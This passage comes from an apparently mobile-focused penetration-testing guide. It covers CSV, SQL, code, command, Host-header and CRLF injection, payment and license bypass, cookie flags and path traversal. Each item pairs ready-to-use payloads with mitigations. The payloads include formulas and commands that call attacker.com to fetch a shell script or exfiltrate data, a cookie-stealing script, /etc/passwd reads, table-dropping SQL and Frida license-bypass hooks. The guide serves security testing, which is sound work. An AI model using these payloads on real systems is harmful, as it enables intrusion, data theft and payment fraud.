5. Check upload response for file path
6. Try to access uploaded file
```

**Expected Output**: Only safe file types allowed, stored securely.

**Vulnerability Confirmation**:
```
Vulnerable if:
- Executable files (.php, .jsp, .asp) uploaded
- Files stored in web-accessible directory
- File extension validation bypassed
- No content validation
- Files executed by server

Result: Remote Code Execution (RCE)
```

**Generic Mitigation**:
- Whitelist allowed file extensions
- Validate file content (magic bytes)
- Rename uploaded files (random names)
- Store files outside webroot
- Disable script execution in upload directory
- Scan files for malware
- Implement file size limits
- Use separate storage (S3, CDN)
- Set proper file permissions (read-only)
- Generate download URLs (no direct access)

---

## INJECTION

### 38. CSV Injection

**Issue Description**: Malicious formulas in CSV exports can execute commands when opened in spreadsheet applications.

**Execution Steps**:
```bash
# Test CSV injection payloads:

# 1. In profile/input fields, enter:
=cmd|'/c calc'!A1
=1+1+cmd|'/c calc'!A1
@SUM(1+1)*cmd|'/c calc'!A1
+cmd|'/c calc'!A1
-cmd|'/c calc'!A1

# Payload variations:
=1+1+cmd|' /C powershell IEX(wget attacker.com/shell.ps1)'!A1
=cmd|'/C ping attacker.com'!A1
=IMPORTXML(CONCAT("http://attacker.com?v=",CONCATENATE(A1:E1)),"//a")

# 2. Update user profile:
Name: =cmd|'/c calc'!A1
Email: @SUM(1+1)*cmd|'/c notepad'!A1

# 3. Export data to CSV
Click "Export" in app

# 4. Open CSV in Excel/LibreOffice
# Formula will execute

# Using iOS app:
1. Find data export feature
2. Enter malicious formulas in input fields
3. Export data
4. Open exported CSV
5. Check if formula executes

# Test in different fields:
- Username
- Description
- Notes
- Comments
- Address fields
```

**Expected Output**: Formulas should be escaped/sanitized in CSV output.

**Vulnerability Confirmation**:
```
Vulnerable if CSV contains:
=cmd|'/c calc'!A1  (unescaped)

When opened in Excel:
- Calculator launches
- Command executes
- Data exfiltrated

Safe output:
'=cmd|'/c calc'!A1  (prefixed with single quote)
or
"=""=cmd|'/c calc'!A1"""  (escaped)
```

**Generic Mitigation**:
- Prefix dangerous characters with single quote: ' = + - @
- Escape formulas in CSV output
- Use CSV libraries that auto-escape
- Warn users before opening exports
- Set cell type to text
- Validate input before storage
- Consider JSON/PDF exports instead

---

### 39. SQL Injection

**Issue Description**: Unsanitized user input in SQL queries allows database manipulation and data theft.

**Execution Steps**:
```bash
# Test SQL injection vectors:

# 1. Authentication bypass
Username: admin' OR '1'='1
Password: anything
Username: admin'--
Username: admin' #

# 2. Test in search fields
Search: test' OR '1'='1
Search: test'; DROP TABLE users--
Search: test' UNION SELECT username, password FROM users--

# 3. Numeric parameters
GET /api/user?id=123
Try: ?id=123 OR 1=1
Try: ?id=123' OR '1'='1

# 4. Boolean-based blind SQLi
?id=1' AND 1=1--  (True - normal response)
?id=1' AND 1=2--  (False - different response)

# 5. Time-based blind SQLi
?id=1' AND SLEEP(5)--
?id=1' AND WAITFOR DELAY '0:0:5'--

# 6. UNION-based SQLi
?id=1' UNION SELECT NULL,NULL,NULL--
?id=1' UNION SELECT username,password,email FROM users--

# 7. Error-based SQLi
?id=1' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT((SELECT version()),0x3a,FLOOR(RAND()*2))x FROM information_schema.tables GROUP BY x)y)--

# Using Burp Suite:
1. Identify input parameters
2. Send to Intruder
3. Load SQLi payload list
4. Analyze responses for differences

# Using sqlmap:
sqlmap -u "https://api.example.com/user?id=1" \
       --cookie="session=ABC123" \
       --dump

# Test in iOS app:
1. Find input fields (login, search, filters)
2. Intercept requests in proxy
3. Inject SQL payloads
4. Monitor responses for errors or data
```

**Expected Output**: All inputs properly sanitized, no SQL execution.

**Vulnerability Confirmation**:
```
SQLi confirmed if:
- SQL error messages appear
- Authentication bypassed
- Different responses for true/false conditions
- Time delays observed
- Unauthorized data retrieved
- UNION queries return data

Example errors:
"You have an error in your SQL syntax"
"mysql_fetch_array() expects parameter 1"
"ORA-00933: SQL command not properly ended"
```

**Generic Mitigation**:
- Use parameterized queries/prepared statements
- Use ORM frameworks
- Input validation and sanitization
- Principle of least privilege (DB user)
- Disable error messages in production
- Use stored procedures
- Implement WAF
- Regular security scanning
- Code review
- Example secure code (Swift):
```swift
let query = "SELECT * FROM users WHERE id = ?"
statement.bind(id)  // Parameterized
```

---

### 40. Code Injection

**Issue Description**: User input executed as code allows arbitrary command execution.

**Execution Steps**:
```bash
# Test code injection vectors:

# 1. JavaScript injection (if WebView used)
<script>alert(document.cookie)</script>
javascript:alert('XSS')

# 2. Template injection
{{7*7}}  (Result: 49 indicates SSTI)
${7*7}
<%= 7*7 %>
{{config}}
{{request}}

# 3. Expression Language injection
${applicationScope}
#{7*7}

# 4. Server-Side Template Injection (SSTI)
# Jinja2:
{{''.__class__.__mro__[1].__subclasses__()}}

# 5. Python code injection
eval() or exec() abuse:
Input: __import__('os').system('whoami')

# 6. Ruby injection
Input: <%= system('whoami') %>

# Test in iOS app:
1. Find dynamic content rendering
2. Input special characters: { } $ < > %
3. Test template syntax
4. Monitor responses

# Using Burp Suite:
1. Identify input fields
2. Inject template syntax
3. Look for evaluated expressions
4. Test with mathematical operations: {{7*7}}
```

**Expected Output**: Input treated as data, not code.

**Vulnerability Confirmation**:
```
Code injection confirmed:
- {{7*7}} returns 49
- Commands execute
- System information leaked
- File system access gained
- Server-side code executed

Result: Remote Code Execution (RCE)
```

**Generic Mitigation**:
- Never use eval() or similar functions
- Avoid dynamic code execution
- Use safe template engines
- Input validation and escaping
- Sandboxed execution environments
- Principle of least privilege
- Content Security Policy
- Regular security audits

---

### 41. OS Command Injection

**Issue Description**: Unsanitized input passed to system commands allows arbitrary OS command execution.

**Execution Steps**:
```bash
# Test command injection:

# 1. Basic injection
Input: test; whoami
Input: test | whoami
Input: test & whoami
Input: test && whoami
Input: test || whoami
Input: test `whoami`
Input: test $(whoami)

# 2. Blind command injection
Input: test; sleep 10
Input: test | ping -c 10 127.0.0.1

# 3. Out-of-band detection
Input: test; curl http://attacker.com/$(whoami)
Input: test; nslookup attacker.com

# 4. Command chaining
Input: test; cat /etc/passwd
Input: test | ls -la /
Input: test & ping -c 5 attacker.com

# 5. Test in different parameters:
# File name:
filename=test.txt; cat /etc/passwd
# IP address:
ip=127.0.0.1; cat /etc/passwd
# URL:
url=http://test.com`whoami`

# Using Burp Suite:
1. Identify parameters processed by system
2. Inject command injection payloads
3. Look for command output or delays
4. Test various separators

# Common vulnerable functions:
- system()
- exec()
- shell_exec()
- popen()
- passthru()

# Example in iOS backend:
POST /api/ping
{"host": "127.0.0.1; cat /etc/passwd"}
```

**Expected Output**: Input sanitized, commands not executed.

**Vulnerability Confirmation**:
```
Command injection confirmed:
- Commands execute successfully
- Output returned in response
- Time delays observed (sleep/ping)
- Out-of-band connections detected
- System files accessed

Example vulnerable code:
system("ping " + userInput)

Safe:
Use libraries, not shell commands
Validate input against whitelist
```

**Generic Mitigation**:
- Avoid system calls with user input
- Use language-specific libraries
- Input validation (whitelist)
- Escape shell metacharacters
- Principle of least privilege
- Use APIs instead of CLI commands
- Disable unnecessary system functions
- Example safe code:
```python
# Bad
os.system("ping " + user_input)

# Good
subprocess.run(["ping", "-c", "1", validated_ip])
```

---

### 42. Host Header Injection

**Issue Description**: Manipulating Host header can lead to password reset poisoning, cache poisoning, and web cache deception.

**Execution Steps**:
```bash
# Test Host header injection:

# 1. Password reset poisoning
POST /api/forgot-password
Host: attacker.com
{"email": "victim@example.com"}

# Reset link sent to victim:
https://attacker.com/reset?token=ABC123

# 2. Cache poisoning
GET / HTTP/1.1
Host: attacker.com
# If cached, all users get attacker's content

# 3. Web cache deception
GET /profile HTTP/1.1
Host: evil.com
# Profile cached at evil.com

# 4. SSRF via Host header
GET /api/internal HTTP/1.1
Host: localhost:8080

# 5. Virtual host bypass
GET /admin HTTP/1.1
Host: internal-admin.example.com

# Using Burp Suite:
1. Intercept any request
2. Change Host header to attacker domain
3. Check response and behavior
4. Test password reset with modified Host
5. Check if links use Host header value

# Test variations:
Host: attacker.com
Host: example.com:@attacker.com
Host: example.com%00attacker.com
X-Forwarded-Host: attacker.com
X-Host: attacker.com
```

**Expected Output**: Host header validated, trusted domains only.

**Vulnerability Confirmation**:
```
Vulnerable if:
- Password reset links use Host header
- Cached content served from wrong host
- Internal services accessible
- Links in emails use Host header value
- SSRF via Host manipulation

Example:
Reset email contains:
https://attacker.com/reset?token=ABC123
Victim clicks → attacker gets token
```

**Generic Mitigation**:
- Validate Host header server-side
- Whitelist allowed hosts
- Use absolute URLs with trusted domain
- Don't trust Host header for links
- Configure virtual hosts properly
- Use X-Forwarded-Host carefully
- Implement proper cache keys

---

### 43. CRLF Injection

**Issue Description**: Injecting CR (\\r) and LF (\\n) characters can manipulate HTTP headers and enable attacks.

**Execution Steps**:
```bash
# Test CRLF injection:

# 1. HTTP Response Splitting
GET /redirect?url=/%0d%0aSet-Cookie:session=malicious

# 2. Header injection
GET /api?param=value%0d%0aX-Malicious:true

# 3. XSS via CRLF
GET /page?param=%0d%0aContent-Length:35%0d%0a%0d%0a<script>alert(1)</script>

# 4. Session fixation
GET /login?next=/%0d%0aSet-Cookie:sessionid=attacker_session

# 5. Cache poisoning
GET /page?param=%0d%0aContent-Type:text/html%0d%0a%0d%0a<html><body>Malicious</body></html>

# Payload encoding:
%0d = \r (Carriage Return)
%0a = \n (Line Feed)
%0d%0a = \r\n (CRLF)

# Test in iOS app:
1. Find redirect or URL parameters
2. Intercept request
3. Inject CRLF sequences
4. Check response headers

# Using Burp Suite:
1. Identify parameters reflected in headers
2. Inject: test%0d%0aInjected-Header:value
3. Check if header appears in response
4. Try to inject full response body

# Example vulnerable parameter:
?redirect=https://example.com%0d%0aSet-Cookie:admin=true
```

**Expected Output**: CRLF characters stripped or encoded.

**Vulnerability Confirmation**:
```
CRLF injection successful:
- New headers injected in response
- Cookies set via injection
- Response splitting achieved
- XSS payload executed
- Cache poisoned

Example response:
HTTP/1.1 302 Found
Location: https://example.com
Set-Cookie: admin=true  ← Injected!
```

**Generic Mitigation**:
- Validate and sanitize all inputs
- Remove or encode CRLF characters
- Use framework's redirect functions
- Don't reflect user input in headers
- Implement Content Security Policy
- Use modern frameworks (auto-protection)
- Regular security testing

---

## ERROR HANDLING

### 44. Insecure Error Handling

**Issue Description**: Verbose error messages expose sensitive information about the application architecture.

**Execution Steps**:
```bash
# Trigger various errors:

# 1. SQL errors
GET /api/user?id=1' → SQL syntax error

# 2. File path errors
GET /api/download?file=../../../../etc/passwd

# 3. Stack traces
POST /api/invalid-endpoint with malformed data

# 4. Database connection errors
Cause DB timeout or connection failure

# 5. Authentication errors
Detailed password requirements
"Password must contain..."

# 6. API errors
POST /api/endpoint with invalid JSON

# Test in iOS app:
1. Cause app errors (invalid input)
2. Intercept error responses
3. Check for sensitive information
4. Monitor logs

# Using Burp Suite:
1. Send malformed requests
2. Invalid content-types
3. SQL injection attempts
4. Path traversal attempts
5. Analyze error responses

# Look for information disclosure:
- Stack traces
- File paths (/var/www/html/app.php)
- Database names and structure
- Version information
- Internal IP addresses
- Framework details
- Debug information
```

**Expected Output**: Generic error messages, no sensitive details.

**Vulnerability Confirmation**:
```
Information disclosed:
Stack trace:
  File "/var/www/app/models/user.py", line 42
  Database: mysql://root@localhost/appdb
  Framework: Django 2.1.5
  Server: Ubuntu 18.04

SQL errors:
  "Table 'database.users' doesn't exist"
  "Column 'password_hash' unknown"

Good error message:
  "An error occurred. Please try again later."
  Error ID: 12345 (for support reference)
```

**Generic Mitigation**:
- Generic error messages for users
- Detailed errors only in logs
- Disable debug mode in production
- Custom error pages
- Log errors server-side with IDs
- Don't expose stack traces
- Filter sensitive information
- Implement error handling middleware
- Regular error log reviews

---

## BUSINESS LOGIC BYPASS

### 45. Payment Tampering

**Issue Description**: Manipulating payment parameters to reduce cost or bypass payment.

**Execution Steps**:
```bash
# Test payment manipulation:

# 1. Price manipulation
POST /api/checkout
{"item_id": 123, "price": 99.99}
# Change to:
{"item_id": 123, "price": 0.01}

# 2. Quantity manipulation
{"item_id": 123, "quantity": 1, "price": 100}
# Change to:
{"item_id": 123, "quantity": -1, "price": 100}
# Result: Credit to account?

# 3. Currency manipulation
{"amount": 100, "currency": "USD"}
# Change to:
{"amount": 100, "currency": "JPY"}  # ¥100 instead of $100

# 4. Discount code reuse
Apply discount code multiple times

# 5. Race condition
Submit payment multiple times simultaneously
Get product multiple times, charged once

# 6. Coupon manipulation
{"coupon": "SAVE10"}  # 10% off
# Change to:
{"coupon": "SAVE100"}  # 100% off?

# Using Burp Suite:
1. Intercept checkout request
2. Send to Repeater
3. Modify price/quantity/currency
4. Submit and check if accepted

# Test in iOS app:
1. Add items to cart
2. Proceed to checkout
3. Intercept payment request
4. Modify payment parameters
5. Complete purchase with modified values
```

**Expected Output**: Server validates all payment parameters.

**Vulnerability Confirmation**:
```
Payment bypass successful:
- Price changed from $100 to $0.01
- Negative quantity creates credit
- Currency changed for lower amount
- Discount code reused infinitely
- Multiple products for single payment

Result: Financial loss
```

**Generic Mitigation**:
- Calculate all prices server-side
- Never trust client-supplied prices
- Validate quantity (positive integers)
- Verify currency codes
- One-time use discount codes
- Implement payment idempotency
- Log all payment attempts
- Real-time fraud detection
- Transaction verification
- Secure payment gateway integration

---

### 46. Bypassing License Registration Process

**Issue Description**: Application license checks can be bypassed to use premium features without payment.

**Execution Steps**:
```bash
# Test license bypass methods:

# 1. Response manipulation
Request: Check license
Response: {"valid": false}
# Change to:
{"valid": true}

# 2. Certificate pinning bypass
# Use Frida to bypass license verification:
frida -U -f com.example.app -l bypass-license.js

# Frida script:
Java.perform(function() {
    var LicenseCheck = Java.use("com.example.LicenseCheck");
    LicenseCheck.isValid.implementation = function() {
        return true;
    };
});

# 3. Time manipulation
Change device date to extend trial

# 4. Local storage manipulation
# If license stored locally:
defaults write com.example.app license "valid"

# 5. Binary patching
# Using Hopper Disassembler:
- Find license check function
- Change conditional jump
- Save modified binary

# 6. Jailbreak detection bypass
If license check requires non-jailbroken device

# 7. Network interception
Intercept license verification request
Return successful response

# Using Objection:
objection -g com.example.app explore
ios hooking watch class LicenseManager
ios hooking set return_value "-[LicenseManager isLicenseValid]" true

# Test in iOS app:
1. Install without license
2. Monitor license check API calls
3. Manipulate responses
4. Check if premium features unlock
```

**Expected Output**: License validation cannot be bypassed.

**Vulnerability Confirmation**:
```
License bypass successful:
- Premium features accessible
- Trial period extended indefinitely
- Offline license check bypassed
- Response manipulation worked
- Local validation defeated

Result: Revenue loss
```

**Generic Mitigation**:
- Server-side license validation
- Code obfuscation
- Anti-tampering checks
- Jailbreak detection
- Certificate pinning
- Encrypt license data
- Regular online validation
- Hardware-based checks (Device ID)
- Multiple validation layers
- Monitor bypass attempts
- Legal terms enforcement

---

### 47. Bypassing Payment Gateway

**Issue Description**: Intercepting or manipulating payment flow to bypass actual payment.

**Execution Steps**:
```bash
# Test payment gateway bypass:

# 1. Direct API manipulation
# Normal flow:
App → Gateway → Payment → Callback → Server

# Bypass:
App → Server (fake success callback)

# 2. Replay attack
Capture successful payment callback:
POST /api/payment/callback
{"transaction_id": "ABC123", "status": "success"}
# Replay for different orders

# 3. Parameter manipulation
POST /api/payment/callback
{
  "order_id": "789",
  "amount": "100.00",
  "status": "success"
}
# Change order_id to another order

# 4. Race condition
Submit order without payment
Immediately submit fake success callback

# 5. Gateway response forgery
POST /api/payment/notify
{
  "merchant_id": "12345",
  "status": "paid",
  "signature": "forged"
}

# Using Burp Suite:
1. Complete a test payment
2. Capture success callback
3. Modify parameters
4. Replay for unauthorized orders
5. Test signature validation

# Test in iOS app:
1. Initiate payment
2. Intercept all network calls
3. Identify callback/webhook
4. Forge success response
5. Check if order completed
```

**Expected Output**: Server validates payment independently with gateway.

**Vulnerability Confirmation**:
```
Payment bypass successful:
- Fake callback accepted
- Order completed without payment
- Signature validation missing
- Replay attack successful
- Amount manipulation possible

Result: Free products/services
```

**Generic Mitigation**:
- Verify all callbacks server-to-server
- Validate digital signatures
- Check transaction IDs with gateway
- Implement idempotency
- Don't trust client-side payment status
- Use webhook secrets
- Verify amounts match
- Log all payment attempts
- Real-time gateway verification
- IP whitelist for callbacks
- Timeout old transactions

---

## WEB SERVER CONFIGURATION

### 48. Missing HttpOnly Flag

**Issue Description**: Cookies without HttpOnly flag are accessible via JavaScript, enabling XSS-based theft.

**Execution Steps**:
```bash
# Check cookie flags:

# 1. Using Burp Suite
Intercept login response
Check Set-Cookie header:
Set-Cookie: sessionid=ABC123; Path=/
# Missing: HttpOnly flag

# 2. Using browser console (if applicable)
document.cookie
# If session visible → HttpOnly missing

# 3. Using curl
curl -i https://api.example.com/login \
     -d "user=test&pass=test"

# Check response:
Set-Cookie: session=ABC123  ← No HttpOnly!

# 4. XSS payload to steal cookies
<script>
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>

# Test in iOS app:
1. Login and capture cookies
2. Check Set-Cookie header
3. If webView used, test JavaScript access
4. Try cookie theft via injected script
```

**Expected Output**: All sensitive cookies have HttpOnly flag.

**Vulnerability Confirmation**:
```
Vulnerable cookies:
Set-Cookie: sessionid=ABC123; Path=/
Set-Cookie: auth_token=XYZ; Path=/; Secure

Both missing HttpOnly!

Secure cookies:
Set-Cookie: sessionid=ABC123; Path=/; Secure; HttpOnly; SameSite=Strict
```

**Generic Mitigation**:
- Set HttpOnly flag on all session cookies
- Set Secure flag (HTTPS only)
- Set SameSite attribute
- Protect against XSS
- Regular security audits
- Example:
```
Set-Cookie: session=ABC; HttpOnly; Secure; SameSite=Strict
```

---

### 49. Missing Secure Flag

**Issue Description**: Cookies without Secure flag can be transmitted over HTTP, enabling interception.

**Execution Steps**:
```bash
# Check Secure flag:

# 1. Inspect Set-Cookie headers
curl -i https://api.example.com/login \
     -d "user=test&pass=test"

Set-Cookie: session=ABC123; Path=/; HttpOnly
# Missing: Secure flag

# 2. Test HTTP transmission
# If app makes HTTP requests:
curl -i http://api.example.com/endpoint \
     -H "Cookie: session=ABC123"
# If cookie sent over HTTP → Vulnerable!

# 3. MITM attack simulation
# On same network:
ettercap -T -M arp:remote /gateway_ip// /victim_ip//
# Capture cookies transmitted over HTTP

# Using Burp Suite:
1. Check all Set-Cookie headers
2. Verify Secure flag present
3. Test if cookies sent over HTTP

# Test in iOS app:
1. Check if app makes HTTP requests
2. Use proxy to downgrade HTTPS to HTTP
3. Check if cookies transmitted
4. Monitor cookie flags in all responses
```

**Expected Output**: All cookies have Secure flag (HTTPS only).

**Vulnerability Confirmation**:
```
Vulnerable if:
Set-Cookie: session=ABC; HttpOnly  ← No Secure!

Attack scenario:
1. User on public WiFi
2. App makes HTTP request
3. Attacker intercepts
4. Session cookie stolen
5. Account hijacked

Secure:
Set-Cookie: session=ABC; Secure; HttpOnly
```

**Generic Mitigation**:
- Set Secure flag on all cookies
- Use HTTPS exclusively (HSTS)
- No mixed content (HTTP/HTTPS)
- Implement certificate pinning
- Regular security reviews
- Force HTTPS redirects
- Example:
```
Set-Cookie: session=ABC; Secure; HttpOnly; SameSite=Lax
```

---

### 50. Cross-Domain Referer Leakage

**Issue Description**: Referer header leaks sensitive information to external domains.

**Execution Steps**:
```bash
# Test Referer leakage:

# 1. Check Referrer-Policy header
curl -I https://app.example.com

# Should have:
Referrer-Policy: no-referrer
# or
Referrer-Policy: strict-origin-when-cross-origin

# 2. Test actual leakage
# Page with sensitive info in URL:
https://app.example.com/reset?token=SECRET123

# Click external link
# Check Referer sent:
GET /page HTTP/1.1
Host: external-site.com
Referer: https://app.example.com/reset?token=SECRET123
# Token leaked!

# 3. Test in iOS app
# If app uses WebView:
1. Navigate to page with sensitive URL
2. Click external link
3. Monitor Referer header
4. Check if sensitive data leaked

# Using Burp Suite:
1. Browse application
2. Click external links
3. Check Referer headers
4. Look for sensitive data leakage

# Check for:
- Session tokens in URL
- Reset tokens
- API keys
- User IDs
- Personal information
```

**Expected Output**: Referrer-Policy prevents leakage of sensitive data.

**Vulnerability Confirmation**:
```
Referer leakage found:
Page: https://app.com/user/profile?id=12345&email=user@test.com
External click sends:
Referer: https://app.com/user/profile?id=12345&email=user@test.com

Sensitive data leaked to third-party!

Good implementation:
Referrer-Policy: no-referrer
or
Referrer-Policy: strict-origin
```

**Generic Mitigation**:
- Implement Referrer-Policy header
- Use: no-referrer or strict-origin
- Don't put sensitive data in URLs
- Use POST for sensitive operations
- Add rel="noreferrer" to external links
- Meta tag: <meta name="referrer" content="no-referrer">
- Regular audits

---

### 51. Directory Traversal

**Issue Description**: Improper path validation allows access to files outside intended directory.

**Execution Steps**:
```bash
# Test directory traversal:

# 1. Basic traversal
GET /api/download?file=../../../etc/passwd
GET /api/download?file=..\..\..\..\windows\system32\config\sam

# 2. URL encoding
GET /api/download?file=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd

# 3. Double encoding
GET /api/download?file=%252e%252e%252f%252e%252e%252f

# 4. Unicode encoding
GET /api/download?file=..%c0%af..%c0%af..%c0%afetc/passwd

# 5. Null byte injection
GET /api/download?file=../../../etc/passwd%00.txt

# 6. Absolute paths
GET /api/download?file=/etc/passwd

# Test in iOS app:
1. Find file download/view features
2. Intercept file parameter
3. Inject traversal payloads
4. Check if restricted files accessible

# Using Burp Suite Intruder:
1. Identify file parameters
2. Load directory traversal wordlist
3. Test all payloads
4. Analyze responses

# Target files:
iOS/macOS:
- /etc/passwd
- /etc/hosts
- ~/.bash_history
- /Library/Preferences/

Application files:
- ../config.xml
- ../../database.db
- ../../../private_key.pem
```

**Expected Output**: Access restricted to intended directory only.

**Vulnerability Confirmation**:
```
Directory traversal successful:
Request: /api/file?path=../../../../etc/passwd
Response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...

Result: Unauthorized file access
```

**Generic Mitigation**:
- Validate and sanitize file paths
- Use whitelist of allowed files
- Resolve canonical path
- Check if resolved path within allowed directory
- Don't concatenate user input directly
- Use file IDs instead of names
- Implement proper access controls
- Example safe code:
```python
import os
base_dir = "/var/www/uploads/"
filename = user_input
full_path = os.path.join(base_dir, filename)
real_path = os.path.realpath(full_path)
if not real_path.startswith(base_dir):
    return "Access denied"
```

---

## CODE QUALITY

### 52. Application Accessible on Jailbroken Devices

**Issue Description**: App runs on jailbroken devices, exposing it to various security risks.

**Execution Steps**:
```bash
# Test on jailbroken device:

# 1. Install app on jailbroken iOS device
# Check if app detects jailbreak

# 2. Check jailbreak detection methods
# Common detection techniques:
- Check for Cydia app
- Check for suspicious files/paths
- Check for SSH service
- Fork() test
- Symbolic link verification

# 3. Bypass jailbreak detection
# Using Frida:
frida -U -f com.example.app -l jailbreak-bypass.js

# Frida script example:
var JailbreakCheck = ObjC.classes.JailbreakDetection;
JailbreakCheck["- isJailbroken"].implementation = function() {
    return false;
};

# Using Objection:
objection -g com.example.app explore
ios jailbreak disable

# 4. Check app behavior
1. Install on jailbroken device
2. Launch app
3. Check for warnings/blocks
4. Test all functionality

# 5. Runtime manipulation
# With jailbreak tools:
- Hook functions
- Bypass SSL pinning
- Access keychain
- Dump memory
- Modify app behavior
```

**Expected Output**: App detects jailbreak and handles appropriately.

**Vulnerability Confirmation**:
```
No jailbreak detection:
- App runs normally on jailbroken device
- No warnings or restrictions
- All features accessible

Risks:
- Runtime manipulation
- Memory dumping
- SSL pinning bypass
- Keychain access
- Code injection
```

**Generic Mitigation**:
- Implement jailbreak detection:
  - Check for Cydia
  - Verify file system integrity
  - Check for suspicious processes
  - Fork() test
  - Symbolic link checks
- Multi-layered detection
- Regular updates to detection
- Graceful degradation (warn users)
- Consider blocking sensitive operations
- Code obfuscation
- Runtime integrity checks
- Example detection:
```swift
func isJailbroken() -> Bool {
    #if targetEnvironment(simulator)
    return false
    #else
    let paths = ["/Applications/Cydia.app",
                 "/usr/sbin/sshd",
                 "/bin/bash",
                 "/etc/apt"]
    for path in paths {
        if FileManager.default.fileExists(atPath: path) {
            return true
        }
    }
    return false
    #endif
}
```

---

### 53. Clipboard Not Disabled

**Issue Description**: Sensitive data can be copied to clipboard and accessed by malicious apps.

**Execution Steps**:
```bash
# Test clipboard functionality:

# 1. Test sensitive fields in app
- Password fields
- Credit card numbers
- OTP codes
- Session tokens
- API keys
- Personal information

# 2. Attempt to copy data
Long press on sensitive fields
Check if copy option appears

# 3. Verify clipboard access
After copying, switch to another app
Paste and check if sensitive data accessible

# 4. Test programmatically
# Using Frida to monitor clipboard:
frida -U -f com.example.app

# Frida script:
var UIPasteboard = ObjC.classes.UIPasteboard;
var generalPasteboard = UIPasteboard.generalPasteboard();

Interceptor.attach(
    ObjC.classes.UIPasteboard['- setString:'].implementation,
    {
        onEnter: function(args) {
            console.log("Clipboard: " + ObjC.Object(args[2]).toString());
        }
    }
);

# 5. Check for clipboard monitoring
# Install clipboard monitoring app
# Use app with sensitive data
# Check if other apps can access

# Test scenarios:
1. Enter password
2. Try to copy it
3. Switch to Notes app
4. Attempt to paste
5. Verify if password appears